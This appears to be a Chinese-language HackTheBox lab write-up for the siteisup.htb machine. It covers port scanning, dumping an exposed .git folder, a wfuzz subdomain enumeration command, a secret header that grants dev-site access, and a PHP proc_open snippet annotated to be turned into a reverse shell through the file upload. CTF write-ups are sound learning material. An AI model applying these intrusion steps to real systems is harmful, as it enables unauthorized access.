---
UID: 20250707220055
aliases: 
tags:
  - 打靶
  - 漏洞
  - hackthebox
source: 
cssclasses: 
created: 2025-07-07
---

![image.png](https://s2.loli.net/2025/07/07/XCPgR1Zwx4kQYzB.png)

## 扫描端口
![image.png](https://s2.loli.net/2025/07/07/nrq7cBZdLGXDiSf.png)

发现 80 端口和 22 端口

## web 服务信息收集
![image.png](https://s2.loli.net/2025/07/07/bBc5PnjmvROJZar.png)

是个测试网站是否存在的输入点，输入 url 进行测试

![image.png](https://s2.loli.net/2025/07/09/L1GTbWXOECxHekR.png)

不加 http://就会给过滤掉
![image.png](https://s2.loli.net/2025/07/09/oiA3YE5gLXRKV1D.png)

很大部分输入别的值都是给过滤掉了，尝试 bp 抓包命令注入

![image.png](https://s2.loli.net/2025/07/09/XxrvjUGesMzVW8T.png)

也没有任何的爆出东西，那就不应该是往这方面走的

![image.png](https://s2.loli.net/2025/07/09/ioOIV8xKGa2PcUj.png)

发现到. git 的文件夹，用 git-dumper 进行拉取源码

在源码中发现这个

![image.png](https://s2.loli.net/2025/07/09/oh5G2zCAQfaHFD4.png)


继续收集，用 git log 查看有什么更改的记录吗

![image.png](https://s2.loli.net/2025/07/09/cTBNR8KsLnj2ktF.png)


我们查看一下创建 vhost 那个版本状态

![image.png](https://s2.loli.net/2025/07/09/tbU9NZcGjY6qDQv.png)

需要增加Special-Dev: only4dev 这个参数

我们在枚举的时候发现有个 dev 的子域名
```
wfuzz -c -H "HOST: FUZZ.siteisup.htb" -u "http://siteisup.htb" -w /usr/share/wfuzz/wordlist/general/common.txt --hw 93
```

![image.png](https://s2.loli.net/2025/07/09/kI4VFb8eXsRhxBp.png)

直接访问是访问不了的，没有权限。需要用到刚刚给的. htaccess 的提示。在 bp 抓包后增加一个 Special-Dev: only 4 dev。就会发现成功进去了

![image.png](https://s2.loli.net/2025/07/09/fPFAR1KV4pvDNXU.png)


![image.png](https://s2.loli.net/2025/07/09/hpdc4SPgmTbqljw.png)

我们重点关注源码中的 php 文件，里面应该有这个文件上传页面的源码

会发现文件会上传到 uploads 这个文件夹中
![image.png](https://s2.loli.net/2025/07/09/aymHoCdYI6JS4gV.png)

这个时候就要求助 wp 了，是过滤了很多后缀的文件，还有很多 php 的函数
(php 的命令)[[[PHP： proc_open - Manual](https://www.php.net/manual/en/function.proc-open.php)]]
```
<?php  
$descriptorspec = array(  
0 => array("pipe", "r"), // stdin is a pipe that the child will read from  
1 => array("pipe", "w"), // stdout is a pipe that the child will write to  
2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to  
);  
  
$cwd = '/tmp';  
$env = array('some_option' => 'aeiou');  
  
$process = proc_open('php', $descriptorspec, $pipes, $cwd, $env);  
  
if (is_resource($process)) {  
// $pipes now looks like this:  
// 0 => writeable handle connected to child stdin  
// 1 => readable handle connected to child stdout  
// Any error output will be appended to /tmp/error-output.txt  
  
fwrite($pipes[0], '<?php print_r($_ENV); ?>');  （把这里改成反弹shell就可以了）
fclose($pipes[0]);  
  
echo stream_get_contents($pipes[1]);  
fclose($pipes[1]);  
  
// It is important that you close any pipes before calling  
// proc_close in order to avoid a deadlock  
$return_value = proc_close($process);  
  
echo "command returned $return_value\n";  
}  
?>
```